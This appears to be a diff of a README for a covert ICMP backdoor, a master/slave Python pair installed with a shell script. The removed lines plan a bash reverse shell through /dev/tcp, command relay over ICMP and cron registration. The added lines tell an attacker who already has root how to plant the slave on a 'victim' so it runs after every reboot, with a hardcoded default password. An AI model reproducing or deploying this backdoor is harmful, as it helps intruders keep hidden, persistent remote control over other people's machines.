@@ -1,32 +1,21 @@
 
-Client:
-  -> open port x
-  -> connect to port
-  -> spawn reverse shell to port:  bash -i >& /dev/tcp/localhost/8080 0>&1
-  -> send signal to master to init talk
-  -> while something
-    -> get input from ICMP
-    -> redirect text to spawned bash
+How to:
+  - Change the host IP in both the master.py and slave.py
+  - Change the variable PYTHON_SLAVE in install.sh to the absolute path of slave.py in the victim.
 
 
+The default password is '123456' stored as plain string in slave.py code.
 
-Master:
-  -> listen to connections on port X
-  -> open root shell to comunicate with the other
+As it's situation dependent I decided against deciding the IP dinamically.
+based on:
+https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib
+
+This "package" assumes the attacker already has root access in the victim
+Then, you send the slave.py and execute the install.sh in the victim.
+Now, after every reboot slave.py will run.
 
 
-Write test programs:
-
-Connect on local host ports.
-
--> test ICMP package with arbitrary content - Done
-
--> Test master and client sync
-
--> Test handshake
-
--> test redirect of output to client program and receive it on master
-
--> test send master input to client
-
--> test register as cron job
+Details: The program can only handle one command per line, more than one the behaviour is not specified:
+ex:
+cd ..; ls
+won't work.
